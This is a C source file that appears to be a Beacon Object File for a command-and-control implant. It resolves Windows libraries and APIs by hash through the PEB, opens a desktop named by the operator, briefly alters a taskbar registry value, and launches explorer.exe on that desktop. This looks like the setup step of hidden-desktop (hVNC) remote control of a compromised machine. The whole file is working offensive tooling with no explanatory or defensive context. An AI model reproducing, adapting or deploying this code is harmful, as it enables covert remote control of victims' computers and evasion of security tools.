#include "common.h"

typedef struct
{
    D_API( LdrLoadDll );
    D_API( RtlInitUnicodeString );
    D_API( CreateProcessA );
    D_API( Sleep );
    D_API( GetWindowsDirectoryA );
    D_API( RegOpenKeyExA );
    D_API( RegQueryValueExA );
    D_API( RegSetValueExA );
    D_API( FindWindowA );
    D_API( GetThreadDesktop );
    D_API( SetThreadDesktop );
    D_API( OpenDesktopA );
    D_API( GetCurrentThreadId );
    D_API( CloseDesktop );
    D_API( SHAppBarMessage );
    D_API( RegCloseKey );

} API, *PAPI;

VOID WINAPI BofMain( PBAPI_TABLE BeaconApi, PVOID Argv, INT Argc ) 
{
    API                 Api;
    UNICODE_STRING      Uni;
    DATAP               Parser;

    HANDLE              hNtdll = NULL;
    HANDLE              hKernel32 = NULL;
    HANDLE              hAdvapi32 = NULL;
    HANDLE              hShell32 = NULL;
    HANDLE              hUser32 = NULL;

    PCHAR               DesktopName = NULL;
    HDESK               hDesk = NULL;
    HDESK               hOldDesk = NULL;

    BOOL                proc = FALSE;
    STARTUPINFOA        startupInfo;
    PROCESS_INFORMATION processInfo;
    APPBARDATA          appbarData;


    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    RtlSecureZeroMemory( &Parser, sizeof( Parser ) );

    RtlSecureZeroMemory( &appbarData, sizeof( APPBARDATA ) );
    RtlSecureZeroMemory( &startupInfo, sizeof( STARTUPINFOA ) );
    RtlSecureZeroMemory( &processInfo, sizeof( PROCESS_INFORMATION ) );

    hNtdll = FindModule( H_LIB_NTDLL, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hNtdll == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find ntdll.dll" );
        goto cleanup;
    };

    Api.LdrLoadDll = FindFunction( hNtdll, H_API_LDRLOADDLL );
    Api.RtlInitUnicodeString = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
    if( Api.LdrLoadDll == NULL || Api.RtlInitUnicodeString == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find init functions" );
        goto cleanup;
    };

    hKernel32 = FindModule( H_LIB_KERNEL32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hKernel32 == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find kernel32.dll" );
        goto cleanup;
    };

    hAdvapi32 = FindModule( H_LIB_ADVAPI32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hAdvapi32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( L"advapi32.dll" ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hAdvapi32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hShell32 = FindModule( H_LIB_SHELL32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hShell32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( L"shell32.dll" ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hShell32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    hUser32 = FindModule( H_LIB_USER32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hUser32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( L"user32.dll" ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hUser32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    if( !hAdvapi32 || !hShell32 || !hUser32 )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find required modules" );
        goto cleanup;
    };

    Api.CreateProcessA = FindFunction( hKernel32, H_API_CREATEPROCESSA );
    Api.Sleep = FindFunction( hKernel32, H_API_SLEEP );
    Api.GetWindowsDirectoryA = FindFunction( hKernel32, H_API_GETWINDOWSDIRECTORYA );
    Api.RegCloseKey = FindFunction( hAdvapi32, H_API_REGCLOSEKEY );
    Api.RegOpenKeyExA = FindFunction( hAdvapi32, H_API_REGOPENKEYEXA );
    Api.RegQueryValueExA = FindFunction( hAdvapi32, H_API_REGQUERYVALUEEXA );
    Api.RegSetValueExA = FindFunction( hAdvapi32, H_API_REGSETVALUEEXA );
    Api.GetCurrentThreadId = FindFunction( hKernel32, H_API_GETCURRENTTHREADID );
    Api.SHAppBarMessage = FindFunction( hShell32, H_API_SHAPPBARMESSAGE );
    Api.FindWindowA = FindFunction( hUser32, H_API_FINDWINDOWA );
    Api.GetThreadDesktop = FindFunction( hUser32, H_API_GETTHREADDESKTOP );
    Api.SetThreadDesktop = FindFunction( hUser32, H_API_SETTHREADDESKTOP );
    Api.OpenDesktopA = FindFunction( hUser32, H_API_OPENDESKTOPA );
    Api.CloseDesktop = FindFunction( hUser32, H_API_CLOSEDESKTOP );

    if( Api.CreateProcessA == NULL ||
        Api.Sleep == NULL ||
        Api.GetWindowsDirectoryA == NULL ||
        Api.RegCloseKey == NULL ||
        Api.RegOpenKeyExA == NULL ||
        Api.RegQueryValueExA == NULL ||
        Api.RegSetValueExA == NULL ||
        Api.GetCurrentThreadId == NULL ||
        Api.SHAppBarMessage == NULL ||
        Api.FindWindowA == NULL ||
        Api.GetThreadDesktop == NULL ||
        Api.SetThreadDesktop == NULL ||
        Api.OpenDesktopA == NULL ||
        Api.CloseDesktop == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find required functions" );
        goto cleanup;
    };

    BeaconApi->BeaconDataParse( &Parser, Argv, Argc );

    DesktopName = BeaconApi->BeaconDataExtract( &Parser, NULL );
    if( DesktopName == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get desktop name" );
        goto cleanup;
    };

    hOldDesk = Api.GetThreadDesktop( Api.GetCurrentThreadId() );
    if( hOldDesk == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get original desktop" );
        goto cleanup;
    };

    hDesk = Api.OpenDesktopA( DesktopName, 0, TRUE, GENERIC_ALL );
    if( hDesk == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to open desktop" );
        goto cleanup;
    };

    if( !Api.SetThreadDesktop( hDesk ) )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to set desktop" );
        goto cleanup;
    };

    DWORD   neverCombine = 2;
    PCHAR   valueName = "TaskbarGlomLevel";
    HKEY    hKey = NULL;
    DWORD   value;
    DWORD   size = sizeof( DWORD );
    DWORD   type = REG_DWORD;

    if( Api.RegOpenKeyExA( HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_ALL_ACCESS, &hKey ) != ERROR_SUCCESS ||
        Api.RegQueryValueExA( hKey, valueName, 0, &type, ( PBYTE )&value, &size ) != ERROR_SUCCESS ||
        Api.RegSetValueExA( hKey, valueName, 0, REG_DWORD, ( PBYTE )&neverCombine, size ) != ERROR_SUCCESS )
    {
        BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, "Unable to set registry value - proceeding with launch" );
    };   

    CHAR explorerPath[MAX_PATH * 2] = { 0 };
    if( Api.GetWindowsDirectoryA( explorerPath, MAX_PATH ) == 0 )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get windows directory - Exiting" );
        goto cleanup;
    };
    strcatA( explorerPath, "\\explorer.exe" );

    startupInfo.cb = sizeof( startupInfo );
    startupInfo.lpDesktop = DesktopName;
    proc = Api.CreateProcessA( explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo );
    if( proc == FALSE )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to create process - Exiting" );
        goto cleanup;
    };
    
#if defined( _WIN64 )
    appbarData.cbSize = sizeof( appbarData );
    for ( int i = 0; i < 5; ++i )
    {
        Api.Sleep( 1000 );
        appbarData.hWnd = Api.FindWindowA( "Shell_TrayWnd", NULL );
        if ( appbarData.hWnd )
        {
            break;
        };
    };

    appbarData.lParam = ABS_ALWAYSONTOP;
    Api.SHAppBarMessage( ABM_SETSTATE, &appbarData );
#endif

cleanup:
    if( hOldDesk )
    {
        if( !Api.SetThreadDesktop( hOldDesk ) )
        {
            BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to restore desktop" );
        };

        Api.CloseDesktop( hOldDesk );
    };

    if( hKey )
    {
        if( Api.RegSetValueExA( hKey, valueName, 0, REG_DWORD, ( PBYTE )&value, size ) != ERROR_SUCCESS )
        {
            BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to restore registry value" );
        };

        Api.RegCloseKey( hKey );
    };

    if( hDesk )
    {
        Api.CloseDesktop( hDesk );
    };

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    RtlSecureZeroMemory( &Parser, sizeof( Parser ) );

    return;
};

VOID go( PVOID Argv, INT Argc )
{
    BAPI_TABLE Api;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    Api.BeaconInjectProcess = C_PTR( BeaconInjectProcess );
    Api.BeaconDataExtract   = C_PTR( BeaconDataExtract );
    Api.BeaconDataParse     = C_PTR( BeaconDataParse );
    Api.BeaconDataShort     = C_PTR( BeaconDataShort );
    Api.BeaconIsAdmin       = C_PTR( BeaconIsAdmin );
    Api.BeaconPrintf        = C_PTR( BeaconPrintf );

    BofMain( &Api, Argv, Argc );
};
